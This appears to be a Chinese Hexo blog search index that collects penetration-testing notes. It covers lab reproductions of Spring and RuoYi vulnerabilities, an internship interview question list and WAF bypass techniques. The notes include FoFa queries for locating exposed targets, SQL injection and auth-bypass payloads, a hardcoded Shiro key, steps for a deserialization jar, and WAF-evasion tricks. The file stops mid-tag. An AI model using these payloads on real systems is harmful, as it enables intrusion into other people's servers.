<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Spring框架漏洞</title>
      <link href="/2023/06/22/spring%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2023/06/22/spring%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="Spring概述"><a href="#Spring概述" class="headerlink" title="Spring概述"></a>Spring概述</h2><p>Spring Framework 是一个开源的应用程序框架和 Java 平台的控制容器的反转。由于其强大的功能和易用性，它在行业中被各种程序和系统广泛使用。一些知名产品如 Spring Boot 和 Spring Cloud 都是使用 Spring Framework 开发的。</p><h2 id="框架特征"><a href="#框架特征" class="headerlink" title="框架特征"></a>框架特征</h2><ul><li><p>如果 Web 应用程序的 favicon.ico 图标默认没有更改，是一个小绿叶<br><img src="/../images/image-20230622113805635.png" alt="image-20230622113805635"></p><p>FoFa语法</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">icon_hash=&quot;116323821&quot;</span><br></pre></td></tr></table></figure></li><li><p>如果 web 应用开发者没有修改 SpringBoot Web 应用的默认 4xx、5xx 报错页面，那么当 web 应用程序出现 4xx、5xx 错误时，会报错如下图：</p><p><img src="/../images/image-20230622113724212.png" alt="image-20230622113724212"></p><p>FoFa语法</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">body=&quot;Whitelabel Error Page&quot;</span><br></pre></td></tr></table></figure></li></ul><h2 id="spel表达式"><a href="#spel表达式" class="headerlink" title="spel表达式"></a>spel表达式</h2><p><a href="https://www.wangan.com/p/7fy7f6cf77af4b1a">https://www.wangan.com/p/7fy7f6cf77af4b1a</a></p><h2 id="Spring-Boot-Actuator敏感信息泄露"><a href="#Spring-Boot-Actuator敏感信息泄露" class="headerlink" title="Spring Boot Actuator敏感信息泄露"></a>Spring Boot Actuator敏感信息泄露</h2><h3 id="Actuator概述"><a href="#Actuator概述" class="headerlink" title="Actuator概述"></a>Actuator概述</h3><p><code>Actuator</code> 是 <code>Spring Boot</code> 提供的用来对应用系统进行自省和监控的功能模块，借助于 <code>Actuator</code> 开发者可以很方便地对应用系统某些监控指标进行查看、统计等。</p><p><code>Actuator</code> 的核心是端点 <code>Endpoint</code>，它用来监视应用程序及交互，<code>spring-boot-actuator</code> 中已经内置了非常多的 <code>Endpoint</code>（health、info、beans、metrics、httptrace、shutdown等等），同时也允许我们自己扩展自己的 <code>Endpoints</code>。每个 <code>Endpoint</code> 都可以启用和禁用。要远程访问 <code>Endpoint</code>，还必须通过 <code>JMX</code> 或 <code>HTTP</code> 进行暴露，大部分应用选择<code>HTTP</code>。</p><p><code>Actuator</code> 在带来方便的同时，如果没有管理好，会导致一些敏感的信息泄露；可能会导致我们的服务器，被暴露到外网，服务器可能会沦陷。</p><h3 id="版本问题"><a href="#版本问题" class="headerlink" title="版本问题"></a>版本问题</h3><ul><li><code>Spring Boot</code> &lt; 1.5：默认未授权访问所有端点、</li><li><code>Spring Boot</code> &gt;&#x3D; 1.5：默认只允许访问 <code>/health</code> 和 <code>/info</code> 端点，但是此安全性通常被应用程序开发人员禁用了</li></ul><p>重点关注env和heapdump路径</p><ul><li><p>ENV</p><p>访问&#x2F;env或者&#x2F;actuator&#x2F;env可能会泄露数据库账号密码等敏感信息,但是泄露的密码会用星号进行脱敏，想要获取相应的明文密码，可以尝试通过分析heapdump数据的方式</p></li><li><p>heapdump</p><blockquote><p>Heap Dump也叫堆转储文件，是一个Java进程在某个时间点上的内存快照<br>Heap Dump是有着多种类型的，不过总体上heap dump在触发快照的时候都保存了java对象和类的信息<br>通常在写heap dump文件前会触发一次FullGC，所以heap dump文件中保存的是FullGC后留下的对象信息。其中可能会含有敏感数据，如数据库的密码明文等</p></blockquote><p>访问&#x2F;heapdump或者&#x2F;actuator&#x2F;heapdump</p></li></ul><h3 id="heapdump分析工具"><a href="#heapdump分析工具" class="headerlink" title="heapdump分析工具"></a>heapdump分析工具</h3><ul><li><p>JAVA自带工具</p><p>bin目录下的jhat和jvisualvm</p><ul><li><p>jhat</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">jhat -J-mx512M .\heapdump</span><br></pre></td></tr></table></figure><p>访问本地7000端口，通过关键词搜索</p><img src="../images/image-20230622152038148.png" alt="image-20230622152038148"  /></li><li><p>jvisualvm</p></li></ul></li><li><p><a href="https://github.com/whwlsfb/JDumpSpider">JDumpSpider</a></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">java -jar .\JDumpSpider-1.1-SNAPSHOT-full.jar .\heapdump</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230622152614844.png" alt="image-20230622152614844"></p><p><img src="/../images/image-20230622152600035.png" alt="image-20230622152600035"></p></li></ul><h3 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h3><p><a href="https://blog.zgsec.cn/index.php/archives/129/">https://blog.zgsec.cn/index.php/archives/129/</a></p><h2 id="CVE-2022-22947–Spring-Cloud-Gateway-SPEL-RCE"><a href="#CVE-2022-22947–Spring-Cloud-Gateway-SPEL-RCE" class="headerlink" title="CVE-2022-22947–Spring Cloud Gateway SPEL RCE"></a>CVE-2022-22947–Spring Cloud Gateway SPEL RCE</h2><p>Spring Cloud Gateway是Spring中的一个API网关。存在SpEL表达式注入漏洞，<strong>当攻击者可以访问Actuator API的情况下</strong>，将可以利用该漏洞执行任意命令。</p><h3 id="版本影响"><a href="#版本影响" class="headerlink" title="版本影响"></a>版本影响</h3><ul><li>Spring Cloud Gateway<ul><li>3.1.0</li><li>3.0.0 to 3.0.6</li><li>Older, unsupported versions are also affected</li></ul></li></ul><h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">添加一个包含恶意SpEL表达式的路由/actuator/gateway/routes/hacktest</span><br><span class="line">应用刚添加的路由/actuator/gateway/refresh</span><br><span class="line">访问恶意路由得到结果/actuator/gateway/routes/hacktest</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230622121048903.png" alt="image-20230622121048903"></p><p><img src="/../images/image-20230622121110774.png" alt="image-20230622121110774"></p><h2 id="CVE-2022-22963–Spring-Cloud-Function-SPEL-RCE"><a href="#CVE-2022-22963–Spring-Cloud-Function-SPEL-RCE" class="headerlink" title="CVE-2022-22963–Spring Cloud Function  SPEL RCE"></a>CVE-2022-22963–Spring Cloud Function  SPEL RCE</h2><p>Spring Cloud Function 是Spring cloud中的serverless框架。</p><p>Spring Cloud Function 中的 RoutingFunction 类的 apply 方法将请求头中的“spring.cloud.function.routing-expression”参数作为 Spel 表达式进行处理，造成 Spel 表达式注入漏洞。</p><p>攻击者可通过该漏洞执行任意代码。</p><h3 id="版本影响-1"><a href="#版本影响-1" class="headerlink" title="版本影响"></a>版本影响</h3><p>org.springframework.cloud:spring-cloud-function-context（影响版本：3.0.0.RELEASE~3.2.2）</p><h3 id="复现-1"><a href="#复现-1" class="headerlink" title="复现"></a>复现</h3><p>accept需要修改</p><img src="../images/image-20230622130314936.png" alt="image-20230622130314936"  /><p><img src="/../images/image-20230622130328296.png" alt="image-20230622130328296"></p><h2 id="CVE-2022-22965-–-spring-core-rce"><a href="#CVE-2022-22965-–-spring-core-rce" class="headerlink" title="CVE-2022-22965 – spring-core-rce"></a>CVE-2022-22965 – spring-core-rce</h2><h3 id="版本影响-2"><a href="#版本影响-2" class="headerlink" title="版本影响"></a>版本影响</h3><p>使用JDK9及以上版本的Spring MVC框架<br>spring-webmvc 或 spring-webflux依赖<br>spring framework 5.3.0-5.3.17、5.2.0-5.2.19版本，以及更早的版本</p><h3 id="复现-2"><a href="#复现-2" class="headerlink" title="复现"></a>复现</h3><p>这里环境用vulfocus的，vulhub的不知道为啥不行</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker pull vulfocus/spring-core-rce-2022-03-29</span><br><span class="line">docker run -d -p 8090:8080 --name springrce -it vulfocus/spring-core-rce-2022-03-29</span><br></pre></td></tr></table></figure><p>攻击</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">通过修改Tomcat的日志路径与后缀写入jsp木马</span><br></pre></td></tr></table></figure><p>脚本：<a href="https://github.com/Axx8/SpringFramework_CVE-2022-22965_RCE">https://github.com/Axx8/SpringFramework_CVE-2022-22965_RCE</a></p><p><img src="/../images/image-20230622144319219.png" alt="image-20230622144319219"></p><p><img src="/../images/image-20230622144248672.png" alt="image-20230622144248672"></p><p><img src="/../images/image-20230622143115129.png" alt="image-20230622143115129"></p><p>需要注意的是每次向webhsell请求时都会再次向其写入木马内容</p><p><img src="/../images/image-20230622143518694.png" alt="image-20230622143518694"></p><p>可以通过以下请求进行清除</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">/?class.module.classLoader.resources.context.parent.pipeline.first.pattern=</span><br></pre></td></tr></table></figure><p>总体来说，这个漏洞的利用方法会修改目标服务器配置，导致目标需要重启服务器才能恢复，实际测试中需要格外注意。</p><h2 id="CVE-2022-22978-–-绕过授权访问admin"><a href="#CVE-2022-22978-–-绕过授权访问admin" class="headerlink" title="CVE-2022-22978 – 绕过授权访问admin"></a>CVE-2022-22978 – 绕过授权访问admin</h2><blockquote><p>在Spring Security中使用RegexRequestMatcher且规则中包含带点号的正则表达式时，攻击者可以通过构造恶意数据包绕过身份认证</p></blockquote><h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><blockquote><p>Spring Security 5.5.x &lt; 5.5.7<br>Spring Security 5.6.x &lt; 5.6.4</p></blockquote><h3 id="复现-3"><a href="#复现-3" class="headerlink" title="复现"></a>复现</h3><p><img src="/../images/image-20230622145009253.png" alt="image-20230622145009253"></p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/admin/%0a</span><br><span class="line">/admin/%0d</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230622145034999.png" alt="image-20230622145034999"></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>若依漏洞</title>
      <link href="/2023/06/21/%E8%8B%A5%E4%BE%9D%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2023/06/21/%E8%8B%A5%E4%BE%9D%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="若依"><a href="#若依" class="headerlink" title="若依"></a>若依</h2><p><a href="http://ruoyi.vip/">http://ruoyi.vip/</a></p><p>基于<strong>SpringBoot</strong>的权限管理系统 易读易懂、界面简洁美观。 核心技术采用<strong>Spring、MyBatis、Shiro</strong>没有任何其它重度依赖。</p><blockquote><p>若依的作者将Spring Security替换为shiro</p></blockquote><h2 id="FoFa"><a href="#FoFa" class="headerlink" title="FoFa"></a>FoFa</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">icon_hash=&quot;-1231872293&quot;</span><br><span class="line">body=&quot;若依&quot; 68,137 条匹配结果</span><br><span class="line">body=&quot;若依后台管理框架&quot;   19,575 条匹配结果</span><br><span class="line">js_name=&quot;/ruoyi/login.js&quot;   2,918 条匹配结果</span><br></pre></td></tr></table></figure><p>试了几个，蛮多默认密码的</p><p><img src="/../images/image-20230622103533741.png" alt="image-20230622103533741"></p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>版本选择V4.6.1</p><p>IDEA连接数据库</p><p><img src="/../images/image-20230621190329600.png" alt="image-20230621190329600"></p><p>剩下步骤</p><p>修改配置文件<code>RuoYi-Vue/ruoyi-admin/src/main/resources/logback.xml</code>中的数据库账号和密码</p><p><a href="https://juejin.cn/post/7081625556705345573">RuoYi搭建开发环境 - 掘金</a></p><h2 id="后台Sql注入"><a href="#后台Sql注入" class="headerlink" title="后台Sql注入"></a>后台Sql注入</h2><h3 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h3><p>RuoYi &lt;&#x3D; v4.6.1</p><h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p>分析<a href="https://tttang.com/archive/1712/#toc_0x2-ruoyi-461-sql">https://tttang.com/archive/1712/#toc_0x2-ruoyi-461-sql</a></p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"># POST</span><br><span class="line"></span><br><span class="line">/system/role/list</span><br><span class="line"></span><br><span class="line">params[dataScope]=and extractvalue(1,concat(0x7e,(select user()),0x7e))</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230621195248659.png" alt="image-20230621195248659"></p><h2 id="后台定时任务"><a href="#后台定时任务" class="headerlink" title="后台定时任务"></a>后台定时任务</h2><h3 id="版本-1"><a href="#版本-1" class="headerlink" title="版本"></a>版本</h3><p>RuoYi &lt;&#x3D; v4.6.2</p><h3 id="复现-1"><a href="#复现-1" class="headerlink" title="复现"></a>复现</h3><p>默认密码为admin&#x2F;admin123</p><p>进入后台系统监控下的定时任务功能，可以发现调用目标字符串的字段。</p><p><img src="/../images/image-20230621192434476.png" alt="image-20230621192434476"></p><p>这里存在yaml反序列化漏洞，分析<a href="https://www.cnblogs.com/nice0e3/p/14514882.html">https://www.cnblogs.com/nice0e3/p/14514882.html</a></p><h4 id="生成yaml恶意jar包"><a href="#生成yaml恶意jar包" class="headerlink" title="生成yaml恶意jar包"></a>生成yaml恶意jar包</h4><p><a href="https://github.com/artsploit/yaml-payload">https://github.com/artsploit/yaml-payload</a></p><p>修改项目源码文件 src&#x2F;artsploit&#x2F;AwesomeScriptEngineFactory.java </p><p><img src="/../images/image-20230621210916844.png" alt="image-20230621210916844"></p><p>在idea中打开终端</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">打包为jar包</span></span><br><span class="line">javac src/artsploit/AwesomeScriptEngineFactory.java</span><br><span class="line">jar -cvf yaml-payload.jar -C src/ .</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">开启http服务</span></span><br><span class="line">python -m http.server 1234</span><br></pre></td></tr></table></figure><h4 id="创建定时任务"><a href="#创建定时任务" class="headerlink" title="创建定时任务"></a>创建定时任务</h4><p>工具<a href="https://github.com/thelostworldFree/Ruoyi-All">https://github.com/thelostworldFree/Ruoyi-All</a></p><p><img src="/../images/image-20230621210655817.png" alt="image-20230621210655817"></p><p>开启定时任务</p><p><img src="/../images/image-20230621210752535.png" alt="image-20230621210752535"></p><h4 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h4><p><img src="/../images/image-20230621210823778.png" alt="image-20230621210823778"></p><p><img src="/../images/image-20230621210844522.png" alt="image-20230621210844522"></p><h2 id="shiro反序列化"><a href="#shiro反序列化" class="headerlink" title="shiro反序列化"></a>shiro反序列化</h2><p>前面提到了若依的核心技术采用<strong>Shiro</strong>，如果密钥泄露了，自然就存在shiro反序列化漏洞。</p><p>默认是动态生成密钥，固定密钥可以在<code>application.yml</code>中配置<code>shiro.cookie.cipherKey</code></p><p><img src="/../images/image-20230621193653154.png" alt="image-20230621193653154"></p><p>V4.3.1~V4.6.1，cipherKey使用硬编码zSyK5Kp6PZAAjlT+eeNMlg&#x3D;&#x3D;</p><p><img src="/../images/image-20230621203731261.png" alt="image-20230621203731261"></p><h3 id="复现-2"><a href="#复现-2" class="headerlink" title="复现"></a>复现</h3><p>注意：Shiro在1.4.2版本开始，由AES-CBC加密模式改为了AES-GCM。所以我们在做漏洞验证时，要将payload改成AES-GCM加密模式。（shiro版本在pom.xml中的依赖查看）</p><p><img src="/../images/image-20230621202753098.png" alt="image-20230621202753098"></p><h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p><a href="https://xz.aliyun.com/t/11928#toc-4">【代码审计】若依后台管理系统 - 先知社区</a></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>实习面试</title>
      <link href="/2023/06/21/%E5%AE%9E%E4%B9%A0%E9%9D%A2%E8%AF%95/"/>
      <url>/2023/06/21/%E5%AE%9E%E4%B9%A0%E9%9D%A2%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<h1 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h1><ul><li>自我介绍</li><li>讲一下反序列化漏洞</li><li>dnslog了解吗，是在命令有回显还是无回显的时候用</li><li>dnslog和反弹shell有什么区别</li><li>一句话木马和内存马有什么区别</li><li>常见的waf绕过方式</li><li>文件上传讲讲</li><li>逻辑漏洞知道哪些</li><li>未授权访问漏洞你是怎么挖到的</li><li>sql注入你会用到哪些函数</li><li>spring框架漏洞</li><li>阿里的druid了解吗</li><li>docker容器漏洞，在实战中有遇见过吗</li><li>weblogic框架漏洞</li><li>知道哪些CMS</li><li>若依CMS漏洞知道吗</li><li>2022年以后的漏洞知道哪些</li><li>你了解我们公司吗</li><li>你怎么看待加班</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">被干碎了啊,实战经验太少了，后面几个问题直接沉默不语，回去整理一波漏洞利用吧</span><br><span class="line">还有问题就是，基础漏洞回答的太浅显了，没有问具体的问题，但是我只答了一两个知识点，没有展现对这个漏洞的理解。。</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 面试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>waf绕过学习</title>
      <link href="/2023/06/01/waf%E7%BB%95%E8%BF%87%E5%AD%A6%E4%B9%A0/"/>
      <url>/2023/06/01/waf%E7%BB%95%E8%BF%87%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="知己知彼"><a href="#知己知彼" class="headerlink" title="知己知彼"></a>知己知彼</h2><p><a href="https://www.cnblogs.com/realjimmy/p/12937247.html">WAF功能介绍（入门扫盲篇） - 一觉醒来写程序 - 博客园</a></p><ul><li>规则引擎分为两块，对请求过滤和对响应过滤，而对请求过滤分为两大步，网络层过滤和应用层过滤。</li><li>WAF每条规则都会配置动作，对命中规则的请求进行对应的处理。</li></ul><h3 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h3><p><img src="/../images/image-20230516142728508.png" alt="image-20230516142728508"></p><p>本文以安全狗为例子进行简单学习</p><h3 id="部署位置"><a href="#部署位置" class="headerlink" title="部署位置"></a>部署位置</h3><p><img src="/../images/2015081104292360563.png" alt="enter image description here"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">请求 → CDN → 云waf → 硬waf → WEB服务器 → 软waf → WEB应用程序（代码waf） → (数据库)</span><br></pre></td></tr></table></figure><h2 id="储备知识"><a href="#储备知识" class="headerlink" title="储备知识"></a>储备知识</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">waf了解</span><br><span class="line">各种语法</span><br><span class="line">http协议</span><br><span class="line">web服务器特性</span><br></pre></td></tr></table></figure><h2 id="WAF绕过"><a href="#WAF绕过" class="headerlink" title="WAF绕过"></a>WAF绕过</h2><h3 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h3><p>没有在代码中进行过滤，如有会说明。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">win  10</span><br><span class="line">php  5.6.9</span><br><span class="line">mysql 5.7.26</span><br><span class="line">apache 2.4.39</span><br><span class="line">safe dog V3.5 </span><br></pre></td></tr></table></figure><p>配置如下</p><p><img src="/../images/image-20230516235356524.png" alt="image-20230516235356524"></p><p><img src="/../images/image-20230516150636839.png" alt="image-20230516150636839"></p><p>特征</p><p><img src="/../images/image-20230517003655268.png" alt="image-20230517003655268"></p><p><img src="/../images/image-20230517100649383.png" alt="image-20230517100649383"></p><h3 id="迂回作战"><a href="#迂回作战" class="headerlink" title="迂回作战"></a>迂回作战</h3><blockquote><p>主打一个侧面绕过，利用各种缺陷和特性使得<strong>waf没有解析到payload</strong>，不与waf的规则和策略硬刚</p></blockquote><h4 id="Web服务器特性"><a href="#Web服务器特性" class="headerlink" title="Web服务器特性"></a>Web服务器特性</h4><blockquote><p>Web服务器解析与waf解析不同绕过</p></blockquote><h5 id="IIS-ASP"><a href="#IIS-ASP" class="headerlink" title="IIS+ASP"></a>IIS+ASP</h5><ul><li><p><code>%</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">对于URL请求的参数值中的%，如果和后面的字符构成的字符串在URL编码表之外，ASP脚本处理时会将其忽略。</span><br><span class="line"></span><br><span class="line">select  →  se%lect</span><br></pre></td></tr></table></figure></li><li><p><code>unicode</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">IIS会自动解码unicode</span><br></pre></td></tr></table></figure></li></ul><h5 id="tomcat"><a href="#tomcat" class="headerlink" title="tomcat"></a>tomcat</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/path1/path2/ == ;/path1;foo/path2;bar/;</span><br></pre></td></tr></table></figure><h5 id="参数污染"><a href="#参数污染" class="headerlink" title="参数污染"></a>参数污染</h5><p>传递多个相同参数，利用waf和web服务器解析的参数不同来进行绕过</p><table><thead><tr><th align="left">Web 环境</th><th align="left">参数获取函数</th><th align="left">获取到的参数</th></tr></thead><tbody><tr><td align="left">PHP&#x2F;Apache</td><td align="left">$_GET(“par”)</td><td align="left">last</td></tr><tr><td align="left">JSP&#x2F;Tomcat</td><td align="left">Request.getParameter(“par”)</td><td align="left">first</td></tr><tr><td align="left">Perl(CGI)&#x2F;Apache</td><td align="left">Param(“par”)</td><td align="left">first</td></tr><tr><td align="left">Python&#x2F;Apache</td><td align="left">getvalue(“par”)</td><td align="left">[“first”,”last”]</td></tr><tr><td align="left">ASP.NET&#x2F;IIS</td><td align="left">Request.QueryString(“par”)</td><td align="left">first,last</td></tr></tbody></table><h4 id="Web应用程序层"><a href="#Web应用程序层" class="headerlink" title="Web应用程序层"></a>Web应用程序层</h4><blockquote><p>Web应用程序层（后端代码）解析与waf解析不同</p><p><strong>waf没有根据后端代码来修改策略和规则</strong></p></blockquote><h5 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h5><p>对请求数据进行编码，例如url编码，Unicode编码等，如果waf对数据不能有效的解码，而应用后端能够正常解码，就可以绕过waf。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">json数据支持unicode编码</span><br></pre></td></tr></table></figure><h5 id="多数据来源"><a href="#多数据来源" class="headerlink" title="多数据来源"></a>多数据来源</h5><p>web应用程序从多个地方取值，如</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># php</span></span><br><span class="line"><span class="variable">$param</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;xxxx&#x27;</span>]</span><br></pre></td></tr></table></figure><p>可以从<code>GET,POST,HEADER,METHOD</code>等地方获取用户提交的参数。</p><p>如果waf只对<code>GET，POST</code>进行检测,没有与后端相适应，就可以绕过。</p><h4 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h4><h5 id="分块传输"><a href="#分块传输" class="headerlink" title="分块传输"></a>分块传输</h5><p>Burp插件：<a href="https://github.com/c0ny1/chunked-coding-converter">https://github.com/c0ny1/chunked-coding-converter</a></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Transfer-Encoding: chunked  <span class="comment"># 表示BODY的传输编码方式为chunked（无Content-Length字段）</span></span><br><span class="line"></span><br><span class="line"><span class="number">3</span> <span class="comment"># 指明传输的数据长度</span></span><br><span class="line">a=<span class="number">1</span></span><br><span class="line"><span class="number">0</span> <span class="comment"># 表示传输结束</span></span><br></pre></td></tr></table></figure><p>实验</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_REQUEST</span>[<span class="string">&#x27;id&#x27;</span>] 失败</span><br><span class="line"><span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>] 成功</span><br></pre></td></tr></table></figure><h5 id="keep-alive"><a href="#keep-alive" class="headerlink" title="keep-alive"></a>keep-alive</h5><p>http长连接，发送多个数据包请求，感觉跟请求走私很像</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>Keep-Alive</span><br></pre></td></tr></table></figure><p>需要关闭</p><p><img src="/../images/image-20230517113339255.png" alt="image-20230517113339255"></p><h5 id="multipart-x2F-form-data"><a href="#multipart-x2F-form-data" class="headerlink" title="multipart&#x2F;form-data"></a>multipart&#x2F;form-data</h5><p><strong>推荐阅读</strong></p><p><a href="http://www.moonslow.com/article/tencent_waf_bypass">http://www.moonslow.com/article/tencent_waf_bypass</a></p><blockquote><p><strong>想办法让WAF以为我们是在上传文件，而实际上却是在POST一个参数，这个参数可以是命令注入、SQL注入、SSRF等任意的一种攻击，这样就实现了通用WAF Bypass</strong></p><p>何时是上传文件？何时是POST参数呢？这个关键点在于有没有一个完整的，连续的**filename&#x3D;**，中间可以插入<code>\r\n</code>或者<code>\n</code></p></blockquote><p><img src="/../images/image-20230518163001348.png" alt="image-20230518163001348"></p><h5 id="畸形请求方法"><a href="#畸形请求方法" class="headerlink" title="畸形请求方法"></a>畸形请求方法</h5><p>抓包，然后修改请求方法</p><h5 id="chrest编码"><a href="#chrest编码" class="headerlink" title="chrest编码"></a>chrest编码</h5><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">content-type</span><span class="punctuation">: </span>charest=cp037</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ibm869</span><br><span class="line">ibm870</span><br><span class="line">ibm871</span><br><span class="line">ibm918</span><br><span class="line">iso-2022-cn</span><br><span class="line">iso-2022-jp</span><br><span class="line">iso-2022-jp-2</span><br><span class="line">iso-2022-kr</span><br><span class="line">iso-8859-1</span><br><span class="line">iso-8859-13</span><br><span class="line">iso-8859-15</span><br></pre></td></tr></table></figure><p>脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse </span><br><span class="line">payload = <span class="string">&#x27;&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;&#x27;</span> </span><br><span class="line"><span class="built_in">print</span>(urllib.parse.quote_plus(payload.encode(<span class="string">&quot;IBM037&quot;</span> )))</span><br></pre></td></tr></table></figure><h4 id="waf特性"><a href="#waf特性" class="headerlink" title="waf特性"></a>waf特性</h4><blockquote><p>部署方式，策略与规则缺陷</p></blockquote><h5 id="云waf"><a href="#云waf" class="headerlink" title="云waf"></a>云waf</h5><p><img src="/../images/zh-cn_image_0000001193876233.png" alt="img"></p><p>​通过改变用户域名的DNS解析地址来将Web流量牵引到云WAF引擎集群，经过检测后再回源至真正的Web服务器。</p><p><img src="/../images/zh-cn_image_0000001159784637.png" alt="img"></p><p>​所以如果可以找到目标的真实ip，就可以绕过云waf。</p><h5 id="性能缺陷"><a href="#性能缺陷" class="headerlink" title="性能缺陷"></a>性能缺陷</h5><h6 id="高并发"><a href="#高并发" class="headerlink" title="高并发"></a>高并发</h6><p>用Burp的<code>Trubo Intruder</code>插件,失败</p><p>而且高并发很可能会造成业务系统出现问题。</p><h6 id="脏数据"><a href="#脏数据" class="headerlink" title="脏数据"></a>脏数据</h6><p>为了防止消耗太多的CPU、内存资源，因此许多WAF只检测前面的2M或4M的内容。所以可以通过填充垃圾数据进行绕过。</p><h6 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h6><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">POST</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="operator">%</span><span class="number">23</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230516150951130.png" alt="image-20230516150951130"></p><p>安全🐕在<code>HTTP BODY</code>中检测到了关键字，直接返回500。。</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">POST</span><br><span class="line">a<span class="operator">=</span><span class="number">8172</span><span class="operator">*</span>A<span class="operator">&amp;</span>id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="operator">%</span><span class="number">23</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20230516151625299.png" alt="image-20230516151625299"></p><h6 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h6><p><code>waf</code>可能直接检测长度来拦截</p><p>如安全🐕,<code>GET</code>下是不行的</p><p><img src="/../images/image-20230516151807403.png" alt="image-20230516151807403"></p><h5 id="白名单机制"><a href="#白名单机制" class="headerlink" title="白名单机制"></a>白名单机制</h5><ul><li><p>文件白名单</p><blockquote><p>一些 WAF 为了保证核心功能如登陆功能正常，会在内部设立一个文件白名单，或内容白名单，只要和这些文件或内容有关，无论怎么测试，都不会进行拦截。</p><p>如：WAF 设立了白名单<code>/admin</code>，那么我们的测试 payload 可以通过如下的手法来绕过</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 原来被拦截</span></span><br><span class="line">http:<span class="comment">//a.a/?id=123 and 2*3=6</span></span><br><span class="line"><span class="comment"># 现在不拦截</span></span><br><span class="line">http:<span class="comment">//a.a/?a=/admin&amp;id=123 and 2*3=6</span></span><br></pre></td></tr></table></figure></li><li><p>IP白名单</p><blockquote><p>后端通过Header字段获取源IP</p></blockquote><figure class="highlight http"><table><tr><td class="code"><pre><span 